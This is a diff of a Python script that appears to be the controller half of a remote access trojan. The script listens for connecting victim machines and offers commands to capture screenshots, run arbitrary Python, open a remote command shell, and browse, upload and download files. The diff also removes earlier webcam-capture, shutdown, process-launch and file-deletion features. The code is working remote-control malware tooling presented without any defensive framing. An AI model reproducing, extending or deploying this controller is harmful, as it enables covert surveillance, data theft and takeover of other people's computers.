@@ -2,16 +2,17 @@ import socket, os, time
 
 # Socket Properties
 HOST = "0.0.0.0"
-PORT = 3000
+PORT = 10000
 
-# Defines (Send & Recv) Functions for use
+# Defines shorter/simpler (Send & Recv) Functions for use
 send = lambda data: conn.send(data)
 recv = lambda buffer: conn.recv(buffer)
-bufsize = 1024
-delay = 0.2
+buffer = 1024
+delay = 0.3
 
 os.system("clear" if os.name == "posix" else "cls")
 
+# Listen for Client
 def main():
     global conn, ClientInfo
 
@@ -22,7 +23,7 @@ def main():
         print(f"[1] Error: ({e})"); exit(1)
 
     try:
-        print(f"Listening on Port: ({PORT})\n" + "-"*25)
+        print(f"Listening on Port: ({PORT})\n" + "-"*26)
         objSocket.bind((HOST, PORT)); objSocket.listen(socket.SOMAXCONN)
     except (socket.error, Exception) as e2:
         print(f"[2] Error: ({e2})"); exit(1)
@@ -30,7 +31,7 @@ def main():
     while (True):
         try:
             conn, address = objSocket.accept()
-            ClientInfo = recv(bufsize).decode().split()
+            ClientInfo = conn.recv(buffer).decode().split()
 
             print(f"Computer Connected: ({ClientInfo[0]}) ({ClientInfo[1]})\n")
             return
@@ -38,6 +39,7 @@ def main():
         except (socket.error, Exception) as e3:
             print(f"[3] Error: ({e3})"); exit(1)
 
+# Receive Large Amounts of Data
 def recvall(buffer):
     data = b""
     while (len(data) < buffer):
@@ -54,19 +56,13 @@ def UsableCommands():
     print("(User Interface Commands)              |\n" + \
           "                                       |")
     print("[-sm] Send Message (VBS-Box)           |")
-    print("[-ow] Open Webpage                     |")
     print("[-ss] Capture Screenshot               |")
-    print("[-cw] Capture Webcam                   |")
     print("_______________________________________|")
     print("(System Commands)                      |\n" + \
           "                                       |")
     print("[-si] View System Information          |")
-    print("[-sp] Start Process on Remote Machine  |")
     print("[-pi] Remote Python Interpreter        |")
     print("[-rs] Remote CMD Shell                 |")
-    print("[-sc] Shutdown Computer                |")
-    print("[-rc] Restart Computer                 |")
-    print("[-lc] Lock Computer                    |")
     print("_______________________________________|")
     print("(File Commands)                        |\n" + \
           "                                       |")
@@ -74,43 +70,29 @@ def UsableCommands():
     print("[-vf] View Files                       |")
     print("[-sf] Send File                        |")
     print("[-rf] Receive File                     |")
-    print("[-dl] Delete File/Directory            |")
     print("_______________________________________|\n")
 
-def OpenWebpage():
-    url = input("\nWebpage URL: ")
-    if not (url.startswith("http://") or url.startswith("https://")):
-        print("(Bad URL, use: http/https)\n")
-        return
+def SendMessage():
+    message = input("\nType Message: ")
+    if (len(message) > buffer):
+        print("[-] 1024 Characters Maximum\n")
+    else:
+        send(b"message-box"); time.sleep(delay); send(bytes(message, "utf-8"))
+        print(recv(buffer).decode() + "\n")
 
-    send(b"open-webpage"); time.sleep(delay); send(url.encode())
-    print(recv(bufsize).decode() + "\n")
-
-def Screenshot(current_time):
+def Screenshot(CurrentTime):
     send(b"capture-screenshot")
 
-    if not (recv(bufsize).decode() == "success"):
-        print("(Error Capturing Screen)\n")
+    ScreenshotStatus = recv(buffer).decode()
+    if not (ScreenshotStatus == "success"):
+        print(f"\nUnable to Capture Screen\nError Message: ({ScreenshotStatus})\n")
         return
 
-    buffersize = recv(bufsize).decode()
-    with open(f"screenshot{current_time}.png", "wb") as ImageFile:
-        ImageFile.write(recvall(int(buffersize)))
+    bytesize = int(recv(buffer).decode())
+    with open(f"screenshot{CurrentTime}.png", "wb") as ImageFile:
+        ImageFile.write(recvall(bytesize))
 
-    print("\n[+] Screenshot Captured\n" + f"Total Size: ({str(buffersize)} Bytes)\n")
-
-def Webcam(current_time):
-    send(b"capture-webcam")
-
-    if not (recv(bufsize).decode() == "success"):
-        print("(No Webcam Detected)\n")
-        return
-
-    buffersize = recv(bufsize).decode(); Webcam_Name = recv(bufsize).decode()
-    with open(f"webcam{current_time}.png", "wb") as ImageFile:
-        ImageFile.write(recvall(int(buffersize)))
-
-    print("\n[+] Webcam Captured\n" + f"Camera Name: ({Webcam_Name})\n" + f"Total Size: ({str(buffersize)} Bytes)\n")
+    print("\n[+] Screenshot Captured\n" + f"Total Size Received: ({str(bytesize)} Bytes)\n")
 
 def SystemInformation():
     print(f"\nComputer: ({ClientInfo[1]})")
@@ -119,40 +101,31 @@ def SystemInformation():
     print(f"System: ({ClientInfo[3]} {ClientInfo[4]})")
     print(f"Public IP: ({ClientInfo[5]})\n")
 
-def StartProcess():
-    FileLocation = input("\nRemote File Location: "); send(b"start-process"); time.sleep(delay); send(FileLocation.encode()); ClientResponse = recv(bufsize).decode()
-    if not (ClientResponse == "VALID"):
-        print("(Cannot Find Remote File)\n")
-        return
-
-    print(f"Status: (Process Running)\n")
-
 def PythonInterpreter():
-    send(b"python-interpreter")
-
-    with open("code.txt", "w") as CodeFile:
-        CodeFile.close()
+    with open("code.txt", "w") as Code:
+        Code.close()
 
     if (os.name == "posix"):
-        os.system("xdg-open " + "code.txt")
+        os.system("nano " + "code.txt")
     else:
         os.system("start " + "code.txt")
 
     UserOption = input("\nExecute Code on Remote Machine? (y/n): ").lower()
     if not (UserOption == "y"):
-        send(b"not-sending"); print("Returning...\n"); os.remove("code.txt")
+        print("(Not Executing)\n"); os.remove("code.txt")
         return
 
-    with open("code.txt", "rb") as SendCodeFile:
-        send(SendCodeFile.read())
+    send(b"python-interpreter"); time.sleep(1)
+    with open("code.txt", "rb") as CodeFile:
+        send(CodeFile.read())
 
-    ClientResponse = recv(bufsize).decode()
+    ClientResponse = recv(buffer).decode()
     if not (ClientResponse == "SUCCESS"):
         print(ClientResponse + "\n"); os.remove("code.txt")
         return
 
-    ClientOutput = recv(bufsize).decode(); SplitOutput = ClientOutput.split("<")
-    if (SplitOutput[0] == ""):
+    ClientOutput = recv(buffer).decode(); SplitOutput = ClientOutput.split("<")
+    if (SplitOutput[0] == "no-output"):
         print("\n[Remote Machine Output]\n" + "-"*23 + "\n<No Output>\n")
     else:
         print("\n[Remote Machine Output]\n" + "-"*23 + f"\n{SplitOutput[0]}")
@@ -162,41 +135,56 @@ def PythonInterpreter():
 def RemoteCMD():
     send(b"remote-cmd")
 
-    CurrentRemoteDirectory = recv(bufsize).decode()
-    print("(Remote CMD Active)\n\n", end="")
-
+    CurrentRemoteDirectory = recv(buffer).decode()
     while (True):
-        CMD_Command = input("[ " + CurrentRemoteDirectory + " ]> ").lower()
-        if (CMD_Command == "exit" or CMD_Command == "quit"):
-            send(b"close-cmd"); print("(Exited CMD)\n")
-            break
+        PS_Command = input(f"\n(REMOTE) {CurrentRemoteDirectory}> ").lower()
+        if (PS_Command == "exit"):
+            print("(Exited Cmd)\n"); send(b"exit"); break
 
-        elif (CMD_Command == "cls" or CMD_Command == "clear"):
+        elif (PS_Command == "cls" or PS_Command == "clear"):
             os.system("clear" if os.name == "posix" else "cls")
 
-        elif (CMD_Command == "cmd"):
-            print("Currently in CMD\n\n", end="")
+        elif (PS_Command == "cmd" or PS_Command == "start"):
+            print("Currently in CMD")
 
-        elif (len(CMD_Command) > 0):
-            send(CMD_Command.encode())
-            print(recv(bufsize).decode(), end="")
+        elif (PS_Command == "cd"):
+            print("Cannot change Directory")
+
+        elif (PS_Command == "cat"):
+            print("File not Specified")
+
+        elif (PS_Command == "copy" or PS_Command == "type" or PS_Command == "?"):
+            print("This Command is Disabled")
+
+        elif (len(PS_Command) > 0):
+            send(PS_Command.encode())
+
+            bytesize = int(recv(buffer).decode())
+            data = recvall(bytesize)
+
+            print(str(data, "utf-8"), end="")
         else:
             print(CurrentRemoteDirectory, end="")
 
 def ViewFiles():
     send(b"view-files")
 
-    print(f"Available Drives: ({recv(bufsize).decode()})\n")
-    RemoteDirectory = input("Remote Directory: "); send(RemoteDirectory.encode()); ClientResponse = recv(bufsize).decode()
+    print(f"Available Drives: ({recv(buffer).decode()})\n")
+    RemoteDirectory = input("Remote Directory: "); send(RemoteDirectory.encode()); ClientResponse = recv(buffer).decode()
     if not (ClientResponse == "VALID"):
         print("(Remote Directory Not Found)\n")
         return
 
-    Number_Of_Files = recv(bufsize).decode()
-    buffersize = int(recv(bufsize).decode())
-    files = recvall(buffersize).decode()
+    Number_Of_Files = recv(buffer).decode()
+    bytesize = int(recv(buffer).decode())
+    files = recvall(bytesize).decode()
 
-    print(f"\nFiles: [{Number_Of_Files}]\nCharacter Count: [{buffersize}]\n\n{files}\n")
+    if (bytesize > 0x4b0):
+        print(f"\nFiles: [{Number_Of_Files}]\nCharacter Count: [{bytesize}]\n\nView Remote Files: [rfiles.txt]\n")
+        with open("rfiles.txt", "w") as RemoteFiles:
+            RemoteFiles.write(files)
+    else:
+        print(f"\nFiles: [{Number_Of_Files}]\nCharacter Count: [{bytesize}]\n\n{files}\n")
 
 def SendFile():
     FilePath = input("\nEnter File Path: ")
@@ -207,42 +195,21 @@ def SendFile():
     with open(FilePath, "rb") as file:
         send(file.read())
 
-    print(recv(bufsize).decode() + "\n")
+    print(f"\nFile Name: [{os.path.basename(FilePath)}]\nTotal Size Sent: [{str(os.path.getsize(FilePath))} Bytes]\n")
 
 def ReceiveFile():
-    RemotePath = input("\nRemote File Path: "); send(RemotePath.encode()); ClientResponse = recv(bufsize).decode()
+    send(b"receive-file");
+
+    RemotePath = input("\nRemote File Path: "); send(bytes(RemotePath, "utf-8")); ClientResponse = recv(buffer).decode()
     if not (ClientResponse == "success"):
         print("(Remote File Not Found)\n")
         return
 
-    filename = recv(bufsize).decode(); buffersize = int(recv(bufsize).decode())
+    filename = recv(buffer).decode(); bytesize = int(recv(buffer).decode())
     with open(filename, "wb") as file:
-        file.write(recvall(buffersize))
+        file.write(recvall(bytesize))
 
-    print(f"\n[+] File Received\nFile Name: [{filename}]\nTotal Size: [{buffersize} Bytes]\n")
-
-def Delete():
-    send(b"delete")
-
-    choice = input("\nDelete File/Directory? (f/d): ").lower()
-    if (choice == "f"):
-        send(b"del-file"); file = input("Remote File Path: "); send(file.encode()); ClientResponse = recv(bufsize).decode()
-        if not (ClientResponse == "success"):
-            print("(Remote File Not Found)\n")
-            return
-
-        print("(Remote File Deleted)\n")
-
-    elif (choice == "d"):
-        send(b"del-dir"); directory = input("Remote Directory: "); input("\n[Press Enter to Delete]"); send(directory.encode()); ClientResponse = recv(bufsize).decode()
-        if not (ClientResponse == "success"):
-            print("(Remote Directory Not Found)\n")
-            return
-
-        print("(Remote Directory Deleted)\n")
-
-    else:
-        send(b"error"); print("Invalid Choice, Returning...\n")
+    print(f"\nFile Name: [{filename}]\nTotal Size Received: [{bytesize} Bytes]\n")
 
 def RemoteCommands():
     while (True):
@@ -261,22 +228,13 @@ def RemoteCommands():
                 send(b"append-connection"); print(f"(Appended Connection)\n"); conn.close(); break
 
             elif (command == "-sm"):
-                message = input("\nType Message: "); send(b"message-box"); time.sleep(delay); send(message.encode()); print(recv(bufsize).decode() + "\n")
-
-            elif (command == "-ow"):
-                OpenWebpage()
+                SendMessage()
 
             elif (command == "-ss"):
                 Screenshot("-".join(time.strftime("%H:%M:%S", time.localtime()).split(":")))
 
-            elif (command == "-cw"):
-                Webcam("-".join(time.strftime("%H:%M:%S", time.localtime()).split(":")))
-
             elif (command == "-si"):
                 SystemInformation()
-
-            elif (command == "-sp"):
-                StartProcess()
 
             elif (command == "-pi"):
                 PythonInterpreter()
@@ -284,17 +242,8 @@ def RemoteCommands():
             elif (command == "-rs"):
                 RemoteCMD()
 
-            elif (command == "-sc"):
-                send(b"shutdown-pc"); print(f"Status: ({recv(bufsize).decode()})\n")
-
-            elif (command == "-rc"):
-                send(b"restart-pc"); print(f"Status: ({recv(bufsize).decode()})\n")
-
-            elif (command == "-lc"):
-                send(b"lock-pc"); print(f"Status: ({recv(bufsize).decode()})\n")
-
             elif (command == "-cd"):
-                send(b"current-dir"); print(recv(bufsize).decode() + "\n")
+                send(b"current-dir"); print(recv(buffer).decode() + "\n")
 
             elif (command == "-vf"):
                 ViewFiles()
@@ -303,10 +252,7 @@ def RemoteCommands():
                 SendFile()
 
             elif (command == "-rf"):
-                send(b"receive-file"); ReceiveFile()
-
-            elif (command == "-dl"):
-                Delete()
+                ReceiveFile()
             else:
                 print(f"Unrecognized Command: ({command})\n")
 
